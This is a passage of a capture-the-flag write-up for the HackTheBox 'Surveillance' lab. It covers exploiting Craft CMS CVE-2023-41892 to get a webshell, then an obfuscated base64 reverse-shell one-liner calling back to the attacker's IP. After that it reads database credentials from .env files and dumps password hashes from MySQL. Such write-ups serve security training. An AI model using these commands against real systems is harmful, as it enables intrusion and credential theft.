+</div><p>We can see http redirecting to <code>surveillance.htb</code>, so this must be added to /etc/hosts:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts       
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.129.171.36 surveillance.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Entering the website:</p>
+<p><img src="/post/hackthebox-surveillance/Images/landingpage.png"
+	width="1293"
+	height="600"
+	srcset="/post/hackthebox-surveillance/Images/landingpage_hu82fe8c87c4addc1b032fc0cd99b558e6_151881_480x0_resize_box_3.png 480w, /post/hackthebox-surveillance/Images/landingpage_hu82fe8c87c4addc1b032fc0cd99b558e6_151881_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="517px"
+	
+></p>
+<p>There is nothing on the main page of interest.</p>
+<h3 id="directory-fuzzing-with-feroxbuster">Directory Fuzzing with feroxbuster</h3>
+<p>Enumeration with feroxbuster reveals an admin login page:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ feroxbuster -u http://surveillance.htb/                                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+</span></span><span class="line"><span class="cl">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+</span></span><span class="line"><span class="cl">by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.1
+</span></span><span class="line"><span class="cl">───────────────────────────┬──────────────────────
+</span></span><span class="line"><span class="cl"> 🎯  Target Url            │ http://surveillance.htb/
+</span></span><span class="line"><span class="cl"> 🚀  Threads               │ 50
+</span></span><span class="line"><span class="cl"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"> 👌  Status Codes          │ All Status Codes!
+</span></span><span class="line"><span class="cl"> 💥  Timeout (secs)        │ 7
+</span></span><span class="line"><span class="cl"> 🦡  User-Agent            │ feroxbuster/2.10.1
+</span></span><span class="line"><span class="cl"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span class="line"><span class="cl"> 🔎  Extract Links         │ true
+</span></span><span class="line"><span class="cl"> 🏁  HTTP methods          │ [GET]
+</span></span><span class="line"><span class="cl"> 🔃  Recursion Depth       │ 4
+</span></span><span class="line"><span class="cl">───────────────────────────┴──────────────────────
+</span></span><span class="line"><span class="cl"> 🏁  Press [ENTER] to use the Scan Management Menu™
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">404      GET       63l      222w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span class="line"><span class="cl">301      GET        7l       12w      178c http://surveillance.htb/js =&gt; http://surveillance.htb/js/
+</span></span><span class="line"><span class="cl">301      GET        7l       12w      178c http://surveillance.htb/images =&gt; http://surveillance.htb/images/
+</span></span><span class="line"><span class="cl">301      GET        7l       12w      178c http://surveillance.htb/css =&gt; http://surveillance.htb/css/
+</span></span><span class="line"><span class="cl">301      GET        7l       12w      178c http://surveillance.htb/img =&gt; http://surveillance.htb/img/
+</span></span><span class="line"><span class="cl">302      GET        0l        0w        0c http://surveillance.htb/admin =&gt; http://surveillance.htb/admin/login
+</span></span><span class="line"><span class="cl">200      GET       89l      964w    72118c http://surveillance.htb/images/hero-bg.png
+</span></span><span class="line"><span class="cl">200      GET       56l      237w    22629c http://surveillance.htb/images/w3.png
+</span></span><span class="line"><span class="cl">200      GET      108l      201w     1870c http://surveillance.htb/css/responsive.css
+</span></span><span class="line"><span class="cl">200      GET       46l       97w     1008c http://surveillance.htb/js/custom.js
+</span></span><span class="line"><span class="cl">200      GET      114l      552w    42779c http://surveillance.htb/images/s2.png
+</span></span><span class="line"><span class="cl">200      GET       42l      310w    32876c http://surveillance.htb/images/home.png
+</span></span><span class="line"><span class="cl">302      GET        0l        0w        0c http://surveillance.htb/logout =&gt; http://surveillance.htb/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting this page reveals it is running Craft CMS. This could also be found in the footer of the home page:</p>
+<p><img src="/post/hackthebox-surveillance/Images/admin1.png"
+	width="760"
+	height="553"
+	srcset="/post/hackthebox-surveillance/Images/admin1_hu085f56b7267c729d8d78780695bd3792_17755_480x0_resize_box_3.png 480w, /post/hackthebox-surveillance/Images/admin1_hu085f56b7267c729d8d78780695bd3792_17755_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="329px"
+	
+></p>
+<h3 id="researching-potential-public-vulnerabilities-in-an-old-craftcms-version">Researching potential public vulnerabilities in an old CraftCMS version</h3>
+<p>We can see this CraftCMS version is 4.4.14, based on the home page&rsquo;s hyperlink. Since this is slightly outdated, we can check through git commits to look for significant vulnerabilities. For example, within the notes of patch 4.5.7, we see a mention on fixing RCE vulnerabilities:</p>
+<p><img src="/post/hackthebox-surveillance/Images/patch457.png"
+	width="1037"
+	height="333"
+	srcset="/post/hackthebox-surveillance/Images/patch457_hu3e03d72c64a6c23affc5ee4095394cb0_68941_480x0_resize_box_3.png 480w, /post/hackthebox-surveillance/Images/patch457_hu3e03d72c64a6c23affc5ee4095394cb0_68941_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
+	
+>
+Unfortunately we are not given a list of CVEs to check for what is fixed here. Also searching for generic rce vulns, we might find this critical severity level vulnerability, only fixed in version 4.4.15: <a class="link" href="https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability"  target="_blank" rel="noopener"
+    >https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability</a> This is given a CVE, CVE-2023-41892 with among the highest scores I&rsquo;ve seen in a while. Wow!
+We can find a <a class="link" href="https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce"  target="_blank" rel="noopener"
+    >proof of concept script on github</a> to try out. A few small changes were done to the original script in troubleshooting:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Surveillance</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">diff</span> <span class="n">original</span><span class="o">.</span><span class="n">py</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="mi">25</span><span class="n">c25</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span>     <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">})</span>                                                                                                                 
+</span></span><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>     <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">50</span><span class="n">c50</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span>     <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:8080&#34;</span><span class="p">})</span>    
+</span></span><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>     <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl"><span class="mi">71</span><span class="n">c71</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span>         <span class="n">tmpDir</span> <span class="o">=</span> <span class="s2">&#34;/tmp&#34;</span> <span class="k">if</span> <span class="n">upload_tmp_dir</span> <span class="o">==</span> <span class="s2">&#34;no value&#34;</span> <span class="k">else</span> <span class="n">upload_tmp_dir</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>         <span class="n">tmpDir</span> <span class="o">=</span> <span class="s2">&#34;/tmp&#34;</span> <span class="k">if</span> <span class="s2">&#34;no value&#34;</span> <span class="ow">in</span> <span class="n">upload_tmp_dir</span> <span class="k">else</span> <span class="n">upload_tmp_dir</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we execute, the webshell works!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Surveillance</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">surveillance</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Get</span> <span class="n">temporary</span> <span class="n">folder</span> <span class="ow">and</span> <span class="n">document</span> <span class="n">root</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Write</span> <span class="n">payload</span> <span class="n">to</span> <span class="n">temporary</span> <span class="n">file</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Crash</span> <span class="n">the</span> <span class="n">php</span> <span class="n">process</span> <span class="ow">and</span> <span class="n">write</span> <span class="n">temp</span> <span class="n">file</span> <span class="n">successfully</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Trigger</span> <span class="n">imagick</span> <span class="n">to</span> <span class="n">write</span> <span class="n">shell</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Done</span><span class="p">,</span> <span class="n">enjoy</span> <span class="n">the</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To create a reverse shell, I base64 encode a basic payload from revshells.com and pipe it to base64:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ echo &#39;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDIvODA4MCAwPiYx&#39; | base64 -d | bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now on my nc listener, a reverse shell is established:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8080 
+</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.102] from (UNKNOWN) [10.10.11.245] 38598
+</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1091): Inappropriate ioctl for device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here, we should stabilize the reverse shell using <code>script</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$ script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">&lt;aft/web/cpresources$ script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$ ^Z
+</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp 8080
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Surveillance]
+</span></span><span class="line"><span class="cl">└─$ stty raw -echo; fg 
+</span></span><span class="line"><span class="cl">[1]  + continued  nc -nvlp 8080
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement</h2>
+<h3 id="enumeration-of-environment">Enumeration of environment</h3>
+<p>From env, we can find credentials for mysql:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:~/html/craft$ cat .env
+</span></span><span class="line"><span class="cl"># Read about configuration, here:
+</span></span><span class="line"><span class="cl"># https://craftcms.com/docs/4.x/config/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The application ID used to to uniquely store session and cache data, mutex locks, and more
+</span></span><span class="line"><span class="cl">CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The environment Craft is currently running in (dev, staging, production, etc.)
+</span></span><span class="line"><span class="cl">CRAFT_ENVIRONMENT=production
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The secure key Craft will use for hashing and encrypting data
+</span></span><span class="line"><span class="cl">CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Database connection settings
+</span></span><span class="line"><span class="cl">CRAFT_DB_DRIVER=mysql
+</span></span><span class="line"><span class="cl">CRAFT_DB_SERVER=127.0.0.1
+</span></span><span class="line"><span class="cl">CRAFT_DB_PORT=3306
+</span></span><span class="line"><span class="cl">CRAFT_DB_DATABASE=craftdb
+</span></span><span class="line"><span class="cl">CRAFT_DB_USER=craftuser
+</span></span><span class="line"><span class="cl">CRAFT_DB_PASSWORD=CraftCMSPassword2023!
+</span></span><span class="line"><span class="cl">CRAFT_DB_SCHEMA=
+</span></span><span class="line"><span class="cl">CRAFT_DB_TABLE_PREFIX=
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># General settings (see config/general.php)
+</span></span><span class="line"><span class="cl">DEV_MODE=false
+</span></span><span class="line"><span class="cl">ALLOW_ADMIN_CHANGES=false
+</span></span><span class="line"><span class="cl">DISALLOW_ROBOTS=false
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIMARY_SITE_URL=http://surveillance.htb/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="finding-password-hashes-in-mysql">Finding password hashes in mysql</h3>
+<p>Logging in:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:~/html/craft$ mysql -u craftuser -p
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is 3605
+</span></span><span class="line"><span class="cl">Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB [(none)]&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For the craftdb database, we see a users table:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [craftdb]&gt; show tables;
+</span></span><span class="line"><span class="cl">+----------------------------+
+</span></span><span class="line"><span class="cl">| Tables_in_craftdb          |
+</span></span><span class="line"><span class="cl">+----------------------------+
+</span></span><span class="line"><span class="cl">| addresses                  |
+</span></span><span class="line"><span class="cl">| announcements              |
+</span></span><span class="line"><span class="cl">| assetindexdata             |
+</span></span><span class="line"><span class="cl">| assetindexingsessions      |
+</span></span><span class="line"><span class="cl">| assets                     |
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">| users                      |
+</span></span><span class="line"><span class="cl">| volumefolders              |
+</span></span><span class="line"><span class="cl">| volumes                    |
+</span></span><span class="line"><span class="cl">| widgets                    |
+</span></span><span class="line"><span class="cl">+----------------------------+
+</span></span><span class="line"><span class="cl">63 rows in set (0.000 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Within the users, we can find a hash for user Matthew:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [craftdb]&gt; select firstname,lastname,email,password from users;
+</span></span><span class="line"><span class="cl">+-----------+----------+------------------------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| firstname | lastname | email                  | password                                                     |
+</span></span><span class="line"><span class="cl">+-----------+----------+------------------------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| Matthew   | B        | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
+</span></span><span class="line"><span class="cl">+-----------+----------+------------------------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">1 row in set (0.000 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking in the home folder, we can see that Matthew is a user on this box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@surveillance:~/html/craft$ ls -al /home
+</span></span><span class="line"><span class="cl">total 16
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root       root       4096 Oct 17 11:20 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 18 root       root       4096 Nov  9 13:19 ..
+</span></span><span class="line"><span class="cl">drwxrwx---  3 matthew    matthew    4096 Nov  9 12:45 matthew
+</span></span><span class="line"><span class="cl">drwxr-x---  2 zoneminder zoneminder 4096 Nov  9 12:46 zoneminder
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, cracking the password with a generic <code>rockyou.txt</code> does not yield results in a timely manner. Using the app&rsquo;s <code>database.php</code>, we might find potential credentials for ZoneMinder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
+</span></span><span class="line"><span class="cl">                &#39;password&#39; =&gt; ZM_DB_PASS,
+</span></span><span class="line"><span class="cl">                &#39;database&#39; =&gt; ZM_DB_NAME,
+</span></span><span class="line"><span class="cl">                &#39;host&#39; =&gt; &#39;localhost&#39;,
+</span></span><span class="line"><span class="cl">                &#39;password&#39; =&gt; &#39;ZoneMinderPassword2023&#39;,
+</span></span><span class="line"><span class="cl">                &#39;database&#39; =&gt; &#39;zm&#39;,
+</span></span><span class="line"><span class="cl">                                $this-&gt;default[&#39;host&#39;] = $array[0];
+</span></span><span class="line"><span class="cl">                        $this-&gt;default[&#39;host&#39;] = ZM_DB_HOST;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this database, we can find a new hash for admin.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [zm]&gt; select Username,Password from Users;
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| Username | Password                                                     |
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| admin    | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd. |
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">1 row in set (0.000 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This also does not crack. However, when we enumerate open ports, we can find an internal port open on port 8080:</p>
+<div class="highlight"><div class="chroma">
